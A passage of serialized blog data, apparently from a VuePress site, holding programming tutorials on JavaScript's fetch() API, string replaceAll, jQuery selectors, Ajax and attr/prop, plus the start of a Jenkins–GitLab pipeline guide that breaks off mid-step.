返回一个布尔值，表示是否包含某个标头。\nHeaders.set()：将指定的键名设置为新的键值，如果该键名不存在则会添加。\nHeaders.append()：添加标头。\nHeaders.delete()：删除标头。\nHeaders.keys()：返回一个遍历器，可以依次遍历所有键名。\nHeaders.values()：返回一个遍历器，可以依次遍历所有键值。\nHeaders.entries()：返回一个遍历器，可以依次遍历所有键值对（[key, value]）。\nHeaders.forEach()：依次遍历标头，每个标头都会执行一次参数函数。\n \n 上面的有些方法可以修改标头，那是因为继承自 Headers 接口。对于 HTTP 回应来说，修改标头意义不大，况且很多标头是只读的，浏览器不允许修改。\n这些方法中，最常用的是response.headers.get()，用于读取某个标头的值。 \n let  response  =    await    fetch ( url ) ; \nresponse . headers . get ( 'Content-Type' ) \n // application/json; charset=utf-8 \n \n 1 2 3 Headers.keys()和Headers.values()方法用来分别遍历标头的键名和键值。 \n // 键名 \n for ( let  key  of  myHeaders . keys ( ) )   { \n  console . log ( key ) ; \n } \n\n // 键值 \n for ( let  value  of  myHeaders . values ( ) )   { \n  console . log ( value ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 Headers.forEach()方法也可以遍历所有的键值和键名。 \n let  response  =   await   fetch ( url ) ; \nresponse . headers . forEach ( \n   ( value ,  key )   =>  console . log ( key ,   ':' ,  value ) \n ) ; \n \n 1 2 3 4 #  2.4 读取内容的方法 \n Response对象根据服务器返回的不同类型的数据，提供了不同的读取方法 \n response.text()：得到文本字符串。\nresponse.json()：得到 JSON 对象。\nresponse.blob()：得到二进制 Blob 对象。\nresponse.formData()：得到 FormData 表单对象。\nresponse.arrayBuffer()：得到二进制 ArrayBuffer 对象。\n \n 上面5个读取方法都是异步的，返回的都是 Promise 对象。必须等到异步操作结束，才能得到服务器返回的完整数据。 \n \n response.text() \n \n response.text()可以用于获取文本数据，比如 HTML 文件。 \n const  response  =   await   fetch ( '/users.html' ) ; \n const  body  =   await  response . text ( ) ; \ndocument . body . innerHTML  =  body\n \n 1 2 3 \n response.json() \n \n response.json()主要用于获取服务器返回的 JSON 数据，前面已经举过例子了。 \n \n response.formData() \n \n response.formData()主要用在 Service Worker 里面，拦截用户提交的表单，修改某些数据以后，再提交给服务器。 \n \n response.blob() \n \n response.blob()用于获取二进制文件。 \n const  response  =   await   fetch ( 'flower.jpg' ) ; \n const  myBlob  =   await  response . blob ( ) ; \n const  objectURL  =   URL . createObjectURL ( myBlob ) ; \n\n const  myImage  =  document . querySelector ( 'img' ) ; \nmyImage . src  =  objectURL ; \n \n 1 2 3 4 5 6 上面示例读取图片文件flower.jpg，显示在网页上。 \n \n response.arrayBuffer() \n \n response.arrayBuffer()主要用于获取流媒体文件。 \n const  audioCtx  =   new   window . AudioContext ( ) ; \n const  source  =  audioCtx . createBufferSource ( ) ; \n\n const  response  =   await   fetch ( 'song.ogg' ) ; \n const  buffer  =   await  response . arrayBuffer ( ) ; \n\n const  decodeData  =   await  audioCtx . decodeAudioData ( buffer ) ; \nsource . buffer  =  buffer ; \nsource . connect ( audioCtx . destination ) ; \nsource . loop  =   true ; \n \n 1 2 3 4 5 6 7 8 9 10 上面示例是response.arrayBuffer()获取音频文件song.ogg，然后在线播放的例子。 \n 2.5 Response.clone() \n Stream 对象只能读取一次，读取完就没了。这意味着，前一节的五个读取方法，只能使用一个，否则会报错。 \n let  text  =    await  response . text ( ) ; \n let  json  =    await  response . json ( ) ;    // 报错 \n \n 1 2 上面示例先使用了response.text()，就把 Stream 读完了。后面再调用response.json()，就没有内容可读了，所以报错。\nResponse 对象提供Response.clone()方法，创建Response对象的副本，实现多次读取。 \n const  response1  =   await   fetch ( 'flowers.jpg' ) ; \n const  response2  =  response1 . clone ( ) ; \n\n const  myBlob1  =   await  response1 . blob ( ) ; \n const  myBlob2  =   await  response2 . blob ( ) ; \n\nimage1 . src  =   URL . createObjectURL ( myBlob1 ) ; \nimage2 . src  =   URL . createObjectURL ( myBlob2 ) ; \n \n 1 2 3 4 5 6 7 8 上面示例中，response.clone()复制了一份 Response 对象，然后将同一张图片读取了两次。\nResponse 对象还有一个Response.redirect()方法，用于将 Response 结果重定向到指定的 URL。该方法一般只用在 Service Worker 里面，这里就不介绍了。 \n 2.6 Response.body 属性 \n Response.body属性是 Response 对象暴露出的底层接口，返回一个 ReadableStream 对象，供用户操作。\n它可以用来分块读取内容，应用之一就是显示下载的进度。 \n const  response  =   await   fetch ( 'flower.jpg' ) ; \n const  reader  =  response . body . getReader ( ) ; \n\n while ( true )   { \n   const   { done ,  value }   =   await  reader . read ( ) ; \n\n   if   ( done )   { \n     break ; \n   } \n\n  console . log ( ` Received  ${ value . length }  bytes ` ) \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 上面示例中，response.body.getReader()方法返回一个遍历器。这个遍历器的read()方法每次返回一个对象，表示本次读取的内容块。\n这个对象的done属性是一个布尔值，用来判断有没有读完；value属性是一个 arrayBuffer 数组，表示内容块的内容，而value.length属性是当前块的大小。 \n 三、fetch()的第二个参数：定制 HTTP 请求 \n fetch()的第一个参数是 URL，还可以接受第二个参数，作为配置对象，定制发出的 HTTP 请求。 \n fetch ( url ,  optionObj ) \n \n 1 上面命令的optionObj就是第二个参数。 \n HTTP 请求的方法、标头、数据体都在这个对象里面设置。下面是一些示例。 \n （1）POST 请求 \n const  response  =   await   fetch ( url ,   { \n  method :   'POST' , \n  headers :   { \n     \"Content-type\" :   \"application/x-www-form-urlencoded; charset=UTF-8\" , \n   } , \n  body :   'foo=bar&lorem=ipsum' , \n } ) ; \n\n const  json  =   await  response . json ( ) ; \n \n 1 2 3 4 5 6 7 8 9 上面示例中，配置对象用到了三个属性。 \n method：HTTP 请求的方法，POST、DELETE、PUT都在这个属性设置。\nheaders：一个对象，用来定制 HTTP 请求的标头。\nbody：POST 请求的数据体。\n \n 注意，有些标头不能通过headers属性设置，比如Content-Length、Cookie、Host等等。它们是由浏览器自动生成，无法修改。 \n （2）提交 JSON 数据 \n const  user  =    {  name :    'John' ,  surname :    'Smith'    } ; \n const  response  =   await   fetch ( '/article/fetch/post/user' ,   { \n  method :   'POST' , \n  headers :   { \n    'Content-Type' :   'application/json;charset=utf-8' \n   } , \n  body :   JSON . stringify ( user ) \n } ) ; \n \n 1 2 3 4 5 6 7 8 上面示例中，标头Content-Type要设成'application/json;charset=utf-8'。因为默认发送的是纯文本，Content-Type的默认值是'text/plain;charset=UTF-8'。 \n （3）提交表单 \n const  form  =  document . querySelector ( 'form' ) ; \n\n const  response  =   await   fetch ( '/users' ,   { \n  method :   'POST' , \n  body :   new   FormData ( form ) \n } ) \n \n 1 2 3 4 5 6 #  （4）文件上传 \n 如果表单里面有文件选择器，可以用前一个例子的写法，上传的文件包含在整个表单里面，一起提交。\n另一种方法是用脚本添加文件，构造出一个表单，进行上传，请看下面的例子。 \n const  input  =  document . querySelector ( 'input[type=\"file\"]' ) ; \n\n const  data  =   new   FormData ( ) ; \ndata . append ( 'file' ,  input . files [ 0 ] ) ; \ndata . append ( 'user' ,   'foo' ) ; \n\n fetch ( '/avatars' ,   { \n  method :   'POST' , \n  body :  data\n } ) ; \n \n 1 2 3 4 5 6 7 8 9 10 上传二进制文件时，不用修改标头的Content-Type，浏览器会自动设置 \n （5）直接上传二进制数据 \n let  blob  =   await   new   Promise ( resolve   => \n  canvasElem . toBlob ( resolve ,    'image/png' ) \n ) ; \n\n let  response  =   await   fetch ( '/article/fetch/post/image' ,   { \n  method :    'POST' , \n  body :  blob\n } ) ; \n \n 1 2 3 4 5 6 7 8 #  四、fetch()配置对象的完整 API \n fetch()第二个参数的完整 API 如下。 \n const  response  =   fetch ( url ,   { \n  method :   \"GET\" , \n  headers :   { \n     \"Content-Type\" :   \"text/plain;charset=UTF-8\" \n   } , \n  body :   undefined , \n  referrer :   \"about:client\" , \n  referrerPolicy :   \"no-referrer-when-downgrade\" , \n  mode :   \"cors\" , \n  credentials :   \"same-origin\" , \n  cache :   \"default\" , \n  redirect :   \"follow\" , \n  integrity :   \"\" , \n  keepalive :   false , \n  signal :   undefined \n } ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 fetch()请求的底层用的是 Request() 对象的接口，参数完全一样，因此上面的 API 也是Request()的 API。\n这些属性里面，headers、body、method前面已经给过示例了，下面是其他属性的介绍。 \n cache \n cache属性指定如何处理缓存。可能的取值如下： \n default：默认值，先在缓存里面寻找匹配的请求。\nno-store：直接请求远程服务器，并且不更新缓存。\nreload：直接请求远程服务器，并且更新缓存。\nno-cache：将服务器资源跟本地缓存进行比较，有新的版本才使用服务器资源，否则使用缓存。\nforce-cache：缓存优先，只有不存在缓存的情况下，才请求远程服务器。\nonly-if-cached：只检查缓存，如果缓存里面不存在，将返回504错误。\n mode \n mode属性指定请求的模式。可能的取值如下： \n cors：默认值，允许跨域请求。\nsame-origin：只允许同源请求。\nno-cors：请求方法只限于 GET、POST 和 HEAD，并且只能使用有限的几个简单标头，不能添加跨域的复杂标头，相当于提交表单所能发出的请求。\n credentials \n credentials属性指定是否发送 Cookie。可能的取值如下： \n same-origin：默认值，同源请求时发送 Cookie，跨域请求时不发送。\ninclude：不管同源请求，还是跨域请求，一律发送 Cookie。\nomit：一律不发送。\n \n 跨域请求发送 Cookie，需要将credentials属性设为include。 \n fetch ( 'http://another.com' ,   { \n  credentials :   \"include\" \n } ) ; \n \n 1 2 3 #  signal \n signal属性指定一个 AbortSignal 实例，用于取消fetch()请求 \n keepalive \n keepalive属性用于页面卸载时，告诉浏览器在后台保持连接，继续发送数据。 \n 一个典型的场景就是，用户离开网页时，脚本向服务器提交一些用户行为的统计信息。这时，如果不用keepalive属性，数据可能无法发送，因为浏览器已经把页面卸载了。 \n window . onunload   =   function ( )   { \n   fetch ( '/analytics' ,   { \n    method :   'POST' , \n    body :   \"statistics\" , \n    keepalive :   true \n   } ) ; \n } ; \n \n 1 2 3 4 5 6 7 #  redirect \n redirect属性指定 HTTP 跳转的处理方法。可能的取值如下： \n follow：默认值，fetch()跟随 HTTP 跳转。\nerror：如果发生跳转，fetch()就报错。\nmanual：fetch()不跟随 HTTP 跳转，但是response.url属性会指向新的 URL，response.redirected属性会变为true，由开发者自己决定后续如何处理跳转。\n integrity \n integrity属性指定一个哈希值，用于检查 HTTP 回应传回的数据是否等于这个预先设定的哈希值。 \n 比如，下载文件时，检查文件的 SHA-256 哈希值是否相符，确保没有被篡改。 \n fetch ( 'http://site.com/file' ,   { \n  integrity :   'sha256-abcdef' \n } ) ; \n \n 1 2 3 #  referrer \n referrer属性用于设定fetch()请求的referer标头。\n这个属性可以为任意字符串，也可以设为空字符串（即不发送referer标头）。 \n fetch ( '/page' ,   { \n  referrer :   '' \n } ) ; \n \n 1 2 3 #  referrerPolicy \n referrerPolicy属性用于设定Referer标头的规则。可能的取值如下： \n no-referrer-when-downgrade：默认值，总是发送Referer标头，除非从 HTTPS 页面请求 HTTP 资源时不发送。\nno-referrer：不发送Referer标头。\norigin：Referer标头只包含域名，不包含完整的路径。\norigin-when-cross-origin：同源请求Referer标头包含完整的路径，跨域请求只包含域名。\nsame-origin：跨域请求不发送Referer，同源请求发送。\nstrict-origin：Referer标头只包含域名，HTTPS 页面请求 HTTP 资源时不发送Referer标头。\nstrict-origin-when-cross-origin：同源请求时Referer标头包含完整路径，跨域请求时只包含域名，HTTPS 页面请求 HTTP 资源时不发送该标头。\nunsafe-url：不管什么情况，总是发送Referer标头。\n 五、取消fetch()请求 \n fetch()请求发送以后，如果中途想要取消，需要使用AbortController对象。 \n let  controller  =   new   AbortController ( ) ; \n let  signal  =  controller . signal ; \n\n fetch ( url ,   { \n  signal :  controller . signal\n } ) ; \n\nsignal . addEventListener ( 'abort' , \n   ( )   =>  console . log ( 'abort!' ) \n ) ; \n\ncontroller . abort ( ) ;   // 取消 \n\nconsole . log ( signal . aborted ) ;   // true \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 上面示例中，首先新建 AbortController 实例，然后发送fetch()请求，配置对象的signal属性必须指定接收 AbortController 实例发送的信号controller.signal。 \n controller.abort()方法用于发出取消信号。这时会触发abort事件，这个事件可以监听，也可以通过controller.signal.aborted属性判断取消信号是否已经发出。 \n 下面是一个1秒后自动取消请求的例子。 \n let  controller  =   new   AbortController ( ) ; \n setTimeout ( ( )   =>  controller . abort ( ) ,   1000 ) ; \n\n try   { \n   let  response  =   await   fetch ( '/long-operation' ,   { \n    signal :  controller . signal\n   } ) ; \n }   catch ( err )   { \n   if   ( err . name  ==   'AbortError' )   { \n    console . log ( 'Aborted!' ) ; \n   }   else   { \n     throw  err ; \n   } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 "},{title:"3 Ways To Replace All String Occurrences in JavaScript",frontmatter:{title:"3 Ways To Replace All String Occurrences in JavaScript",date:"2021-10-18 21:37:29",tags:["JavaScript"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript_replaceAll_str.html",relativePath:"blogs/javascript/javascript_replaceAll_str.md",key:"v-8295b0b2",path:"/blogs/javascript/javascript_replaceAll_str.html",headers:[{level:2,title:"Regular expression from a string",slug:"regular-expression-from-a-string"},{level:2,title:"replace() with a string",slug:"replace-with-a-string"},{level:2,title:"The difference between replaceAll() and replace()",slug:"the-difference-between-replaceall-and-replace"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" There’s no easy way to replace all string occurrences in JavaScript. Java, which had served an inspiration for JavaScript in the first days, has the replaceAll() method on strings since 1995! \n In this post, you’ll learn how to replace all string occurrences in JavaScript by splitting and joining a string, and string.replace() combined with a global regular expression. \n Moreover, you’ll read about the new proposal string.replaceAll() (at stage 4) that brings the replace all method to JavaScript strings. This is the most convenient approach. \n Splitting and joining an array \n If you google how to “replace all string occurrences in JavaScript”, most likely the first approach you’d find is to use an intermediate array. \n Here’s how it works: \n \n Split the string into pieces by the search string: \n \n const  pieces  =  string . split ( search ) ; \n \n 1 \n Then join the pieces putting the replace string in between: \n \n const  resultingString  =  pieces . join ( replace ) ; \n \n 1 For example, let’s replace all spaces ' ' with hyphens '-' in 'duck duck go' string: \n const  search  =   ' ' ; \n const  replaceWith  =   '-' ; \n const  result  =   'duck duck go' . split ( search ) . join ( replaceWith ) ; \nresult ;   // => 'duck-duck-go' \n \n 1 2 3 4 'duck duck go'.split(' ')  splits the string into pieces: ['duck', 'duck', 'go'].\nThen the pieces  ['duck', 'duck', 'go'].join('-')  are joined by inserting '-' in between them, which results in the string  'duck-duck-go' . \n Here’s a generalized helper function that uses splitting and joining approach: \n function   replaceAll ( string ,  search ,  replace )   { \n   return  string . split ( search ) . join ( replace ) ; \n } \n replaceAll ( 'abba' ,   'a' ,   'i' ) ;            // => 'ibbi' \n replaceAll ( 'go go go!' ,   'go' ,   'move' ) ;   // => 'move move move!' \n replaceAll ( 'oops' ,   'z' ,   'y' ) ;            // => 'oops' \n \n 1 2 3 4 5 6 This approach requires transforming the string into an array, and then back into a string. Let’s continue looking for better alternatives. \n replace() with a global regular expression \n The string method string.replace(regExpSearch, replaceWith) searches and replaces the occurrences of the regular expression regExpSearch with replaceWith string. \n To make the method replace() replace all occurrences of the pattern you have to enable the global flag on the regular expression: \n \n Append g after at the end of regular expression literal: · /search/g \n Or when using a regular expression constructor, add 'g' to the second argument:  new RegExp('search', 'g') \nLet’s replace all occurrences of ' ' with '-': \n \n const  searchRegExp  =   / \\s / g ; \n const  replaceWith  =   '-' ; \n const  result  =   'duck duck go' . replace ( searchRegExp ,  replaceWith ) ; \nresult ;   // => 'duck-duck-go' \n \n 1 2 3 4 The regular expression literal  /\\s/g  (note the g global flag) matches the space ' '. \n 'duck duck go'.replace(/\\s/g, '-')  replaces all matches of  /\\s/g  with  '-' , which results in  'duck-duck-go' . \n You can easily make case insensitive replaces by adding i flag to the regular expression: \n const  searchRegExp  =   / duck / gi ; \n const  replaceWith  =   'goose' ; \n const  result  =   'DUCK Duck go' . replace ( searchRegExp ,  replaceWith ) ; \nresult ;   // => 'goose goose go' \n \n 1 2 3 4 The regular expression /duck/gi performs a global case-insensitive search (note i and g flags).  /duck/gi  matches 'DUCK', as well as 'Duck'. \n Invoking  'DUCK Duck go'.replace(/duck/gi, 'goose')  replaces all matches of  /duck/gi  substrings with  'goose' . \n Regular expression from a string \n When the regular expression is created from a string, you have to escape the characters  - [ ] / { } ( ) * + ? . \\ ^ $ |  because they have special meaning within the regular expression. \n Because of that, the special characters are a problem when you’d like to make replace all operation. Here’s an example: \n const  search  =   '+' ; \n const  searchRegExp  =   new   RegExp ( search ,   'g' ) ;   // Throws SyntaxError \n const  replaceWith  =   '-' ; \n const  result  =   '5+2+1' . replace ( searchRegExp ,  replaceWith ) ; \n \n 1 2 3 4 The above snippet tries to transform the search string  '+'  into a regular expression. But  '+'  is an invalid regular expression, thus SyntaxError: Invalid regular expression:  /+/ is thrown. \n Escaping the character  '\\\\+'  solves the problem. \n Nevertheless, does it worth escaping the search string using a function like escapeRegExp() to be used as a regular expression? Most likely not. \n replace() with a string \n If the first argument search of string.replace(search, replaceWith) is a string, then the method replaces only the first occurrence of search: \n const  search  =   ' ' ; \n const  replace  =   '-' ; \n const  result  =   'duck duck go' . replace ( search ,  replace ) ; \nresult ;   // => 'duck-duck go' \n \n 1 2 3 4 'duck duck go'.replace(' ', '-')  replaces only the first appearance of a space. \n replaceAll() method \n Finally, the method string.replaceAll(search, replaceWith) replaces all appearances of search string with replaceWith. \n Let’s replace all occurrences of ' ' with '-': \n const  search  =   ' ' ; \n const  replaceWith  =   '-' ; \n const  result  =   'duck duck go' . replaceAll ( search ,  replaceWith ) ; \nresult ;   // => 'duck-duck-go' \n \n 1 2 3 4 'duck duck go'.replaceAll(' ', '-')  replaces all occurrences of ' ' string with '-'. \n string.replaceAll(search, replaceWith) is the best way to replace all string occurrences in a string \n Note that currently, the method support in browsers is limited, and you might require a polyfill. \n The difference between replaceAll() and replace() \n The string methods replaceAll(search, replaceWith) and replace(search, replaceWith) work the same way, expect 2 things: \n If search argument is a string, replaceAll() replaces all occurrences of search with replaceWith, while replace() only the first occurence\nIf search argument is a non-global regular expression, then replaceAll() throws a TypeError exception. \n Key takeaway \n The primitive approach to replace all occurrences is to split the string into chunks by the search string, the join back the string placing the replace string between chunks:  string.split(search).join(replaceWith) . This approach works, but it’s hacky. \n Another approach is to use string.replace(/SEARCH/g, replaceWith) with a regular expression having the global flag enabled. \n Unfortunately, you cannot easily generate regular expressions from a string at runtime, because the special characters of regular expressions have to be escaped. And dealing with a regular expression for a simple replacement of strings is overwhelming. \n Finally, the new string method string.replaceAll(search, replaceWith) replaces all string occurrences. The method is a proposal at stage 4, and hopefully, it will land in a new JavaScript standard pretty soon. \n My recommendation is to use string.replaceAll() to replace strings. \n"},{title:"JS中判断对象是否包含某个key的方法",frontmatter:{title:"JS中判断对象是否包含某个key的方法",date:"2021-07-18T23:58:17.000Z",tags:["JavaScript"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript_ugvbfbCY.html",relativePath:"blogs/javascript/javascript_ugvbfbCY.md",key:"v-87e97576",path:"/blogs/javascript/javascript_ugvbfbCY.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 方法一 \n ! ( \"key\"   in  obj )   //结果为false，表示不包含；否则表示包含 \n \n 1 方法二 \n obj . hasOwnProperty ( \"key\" )   //obj表示对象，结果为false表示不包含；否则表示包含 \n \n 1 模糊查找对象的key\nsome():\n对数组中的每个元素都执行一次指定的函数（callback），直到此函数返回 true，如果发现这个元素，some 将返回 true，如果回调函数对每个元素执行后都返回 false ，some 将返回 false。它只对数组中的非空元素执行指定的函数，没有赋值或者已经删除的元素将被忽略 \n      var  typeTexts  =   { \n       'task' :   '任务消息' , \n       'item' : '项目消息' , \n       'system' :   '系统消息' , \n       'schedule' :   '日程消息' , \n       'people' :   '成员消息' \n     } \n     let  isTask  =  Object . keys ( typeTexts ) . some ( key   =>  key . includes ( 'task' ) ) \n     ` ` `\n \n 1 2 3 4 5 6 7 8 9 "},{title:"Jquery Ajax使用",frontmatter:{title:"Jquery Ajax使用",date:"2021-04-06T16:43:26.000Z",tags:["jQuery","Ajax"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/jquery-ajax-shi-yong.html",relativePath:"blogs/javascript/jquery-ajax-shi-yong.md",key:"v-68069695",path:"/blogs/javascript/jquery-ajax-shi-yong.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 使用Ajax获取的值作为函数的返回值 \n ajax默认使用异步方式，要将异步改为同步方式 \n var  errorMessage  =    test ( '' ,   '' ,   '' ) ; \n\n function   test ( checkedCode ,  checkedName ,  subScreenId )   { \n     let  errorMessage  =   '' ; \n     let  request  =   { \n         \"checkedCode\" : checkedCode , \n         \"checkedName\" : checkedName , \n         \"subScreenId\" : subScreenId\n     } ; \n    $ . ajax ( { \n        url :   '' , \n        type : 'post' , \n        dataType :   \"json\" , \n        data  :  request , \n        async :   false ,   //请求方式：同步 \n     } ) . done ( function ( data ,  textStatus ,  jqXHR ) { \t\t\t\t\n        errorMessage  =  data ; \t\t\t\n     } ) . fail ( function ( jqXHR ,  textStatus ,  errorThrown ) { \t\t\t\t\n        console . log ( errorThrown ) ; \t\t\t\t\n     } ) ; \n     return  errorMessage ; \t\n     } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 "},{title:"jQuery 获取元素(父节点,子节点,兄弟节点)",frontmatter:{title:"jQuery 获取元素(父节点,子节点,兄弟节点)",date:"2021-03-03T15:30:51.000Z",tags:["jQuery","html"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/jquery-huo-qu-yuan-su-fu-jie-dian-zi-jie-dian-xiong-di-jie-dian.html",relativePath:"blogs/javascript/jquery-huo-qu-yuan-su-fu-jie-dian-zi-jie-dian-xiong-di-jie-dian.md",key:"v-6b038912",path:"/blogs/javascript/jquery-huo-qu-yuan-su-fu-jie-dian-zi-jie-dian-xiong-di-jie-dian.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 获取节点元素 \n $ ( "#test1" ) . parent ( ) ;   // 父节点 \n $ ( "#test1" ) . parents ( ) ;   // 全部父节点 \n $ ( "#test1" ) . parents ( ".mui-content" ) ; //返回class为mui-content的父节点 \n $ ( "#test1" ) . children ( ) ;   // 全部子节点 \n $ ( "#test1" ) . children ( "#test1" ) ;   //返回id为test1的子节点 \n $ ( "#test1" ) . contents ( ) ;   // 返回id为test里面的所有内容，包括节点和文本 \n $ ( "#test1" ) . contents ( "#test1" ) ;   //返回id为test里面的id为#test1的节点和文本 \n $ ( "#test1" ) . prev ( ) ;    // 上一个兄弟节点 \n $ ( "#test1" ) . prevAll ( ) ;   // 之前所有兄弟节点 \n $ ( "#test1" ) . next ( ) ;   // 下一个兄弟节点 \n $ ( "#test1" ) . nextAll ( ) ;   // 之后所有兄弟节点 \n $ ( "#test1" ) . siblings ( ) ;   // 所有兄弟节点 \n $ ( "#test1" ) . siblings ( "#test2" ) ;   //返回id为test2的兄弟节点 \n $ ( "#test" ) . find ( "#test1" ) ;   // 选中id为test后代中 id为test1的节点 \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 注意上面的方法 返回的是jquery 集合 需要继续用jq的方法操作或取值\n如果想要转为dom 直接操作的只需要 取它的下标即可\n如: $("#test1").parent()[0] 返回的就是dom节点 \n'},{title:"jQuery检查某个元素在页面上是否存在",frontmatter:{title:"jQuery检查某个元素在页面上是否存在",date:"2021-03-03T15:16:28.000Z",tags:["html","jQuery"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/jquery-jian-cha-mou-ge-yuan-su-zai-ye-mian-shang-shi-fou-cun-zai.html",relativePath:"blogs/javascript/jquery-jian-cha-mou-ge-yuan-su-zai-ye-mian-shang-shi-fou-cun-zai.md",key:"v-76caf955",path:"/blogs/javascript/jquery-jian-cha-mou-ge-yuan-su-zai-ye-mian-shang-shi-fou-cun-zai.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 用jQuery检查某个元素在网页上是否存在时，应该根据获取元素的长度来判断，代码如下： \n if ( $ ( "#tt" ) . length  >   0 )   { \n     // 元素存在时执行的代码 \n } \n \n 1 2 3 '},{title:"Jquery中attr与prop的区别详解",frontmatter:{title:"Jquery中attr与prop的区别详解",date:"2021-04-06T15:56:44.000Z",tags:["jQuery"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/jquery-zhong-attr-yu-prop-de-qu-bie-xiang-jie.html",relativePath:"blogs/javascript/jquery-zhong-attr-yu-prop-de-qu-bie-xiang-jie.md",key:"v-69f32783",path:"/blogs/javascript/jquery-zhong-attr-yu-prop-de-qu-bie-xiang-jie.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" .attr() \n 获取匹配的元素集合中的第一个元素的属性的值  或 设置每一个匹配元素的一个或多个属性 \n .prop() \n 获取匹配的元素集中第一个元素的属性（property）值或设置每一个匹配元素的一个或多个属性。 \n prop()函数的结果: \n   1.如果有相应的属性，返回指定属性值。\n  2.如果没有相应的属性，返回值是空字符串。\n attr()函数的结果: \n   1.如果有相应的属性，返回指定属性值。\n  2.如果没有相应的属性，返回值是undefined。\n 总结 \n 对于HTML元素本身就带有的固有属性，在处理时，使用prop方法。\n对于HTML元素我们自己自定义的DOM属性，在处理时，使用attr方法。\n具有 true 和 false 两个属性的属性，如 checked, selected 或者 disabled 使用prop() \n"},{title:"判断 jQuery 对象的类型",frontmatter:{title:"判断 jQuery 对象的类型",date:"2021-03-03T15:46:52.000Z",tags:["jQuery","input","html"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/pan-duan-jquery-dui-xiang-de-lei-xing.html",relativePath:"blogs/javascript/pan-duan-jquery-dui-xiang-de-lei-xing.md",key:"v-04126f96",path:"/blogs/javascript/pan-duan-jquery-dui-xiang-de-lei-xing.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" if (  jquery对象 . is ( \"input\" )   ) { \n     alert ( 'input' ) ; \n }   else   if (  jquery对象 . is ( \"select\" )   ) { \n     alert ( 'select' ) ; \n } \n \n 1 2 3 4 5 "},{title:"Create a Jenkins Pipeline with GitLab for Java Projects",frontmatter:{title:"Create a Jenkins Pipeline with GitLab for Java Projects",date:"2021-09-05 18:06:25",tags:["jenkins","gitlab","java"],categories:"deploy",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/jenkins/jenkins_gitlab_pipeline.html",relativePath:"blogs/jenkins/jenkins_gitlab_pipeline.md",key:"v-1b44a315",path:"/blogs/jenkins/jenkins_gitlab_pipeline.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" This post will show you how to configure a Jenkins pipeline that will automatically build your project when you push code to a GitLab repository. We will be using a Jenkinsfile to define our pipeline, which is best practice.\nHere’s the workflow:\nPush to GitLab → Jenkins pipeline triggered → Run build (Maven) → Run JUnit tests (Maven) → Email result from pipeline\nIf you don’t already have GitLab and Jenkins installed, you can follow the instructions in this post and then come back here.\nThis post also assumes you have Java, Git, and Maven installed, along with a simple Maven project with at least one JUnit test. Make sure you’re able to successfully run mvn clean install and mvn test on your project before following along. \n Step 1: Create a GitLab Repository \n In GitLab, create a group by clicking on the Groups dropdown and then clicking the New group button. Give your group a name and then click Create group. \n \n Create a new project by clicking New project. Give it a name and click Create project. \n \n Initialize your local Maven project and push it to your new repository: \n cd  existing_folder\n git  init\n git  remote  add  origin http://localhost/my-group/my-project.git\n git   add   . \n git  commit -m  \"Initial commit\" \n git  push -u origin master\n \n 1 2 3 4 5 6 Refresh your project in GitLab and you should see your code. If you see a banner saying “The Auto DevOps pipeline has been enabled…” go into settings and disable it. \n Step 2: Create a Jenkins User in GitLab \n We need to create a Jenkins user in GitLab so that Jenkins can communicate with GitLab’s API via the plugin we will install in Step 4.\nIn GitLab, go to the Admin Area by clicking on the wrench icon in the top toolbar. \n In the left menu, click on Users and then click New user at the top right hand corner. Fill out the required fields appropriately and make sure to select the Admin radio button under Access level: \n \n Go back to the Users page and edit the Jenkins user you just created. Give the user a password so that you can log in as that user. Once you’ve done this, log out of your current session and log in as the Jenkins user.\nOnce logged in as the Jenkins user, go to your settings and click Access Tokens in the left menu bar. Make sure to give your token a name and select api under Scopes. \n \n Once you have created the access token, copy and paste the token somewhere temporarily — you will not be able to access it from here again. We will use this token later.\nLog out and log back in as the root user. \n Step 3: Create a GitLab User in Jenkins \n Now, we need to create a GitLab user in Jenkins so that GitLab can notify Jenkins of updates to the repository via webhooks.\nFrom the Jenkins homepage, go to Manage Jenkins → Manage Users → Create User and fill in the form. \n \n After creating the user, log out and log back in as the “gitlab” user.\nGo to Manage Jenkins → Manage Users and click on the gear icon next to the gitlab user to configure it. Under API Token, click Add new Token and give it a name, then click Generate. \n \n Once you have generated the token, copy and paste the token somewhere temporarily — you will not be able to access it from here again. We will use this token later.\nLog out and log back in as the admin user. \n Step 4: Install and Configure GitLab Plugin for Jenkins \n We need to install the GitLab plugin for Jenkins so that they can communicate with each other.\nOn the Jenkins homepage, click on Manage Jenkins → Manage Plugins. Click on the Available tab and search for “gitlab” and install the GitLab plugin. \n \n Check the box for “Restart Jenkins when installation is complete…” If you miss this, you can also restart Jenkins with sudo  systemctl restart jenkins  after the download has finished. \n \n After about a minute, refresh the page and log back in as the admin user again.\nIn Jenkins, go to Manage Jenkins → Configure System and scroll down to the Gitlab section. Enter in a name for the connection, the URL to your GitLab instance, and then next to Credentials, click Add → Jenkins. This is where you will add your GitLab token from Step 2. \n \n Next to Kind, select GitLab API Token. Paste your 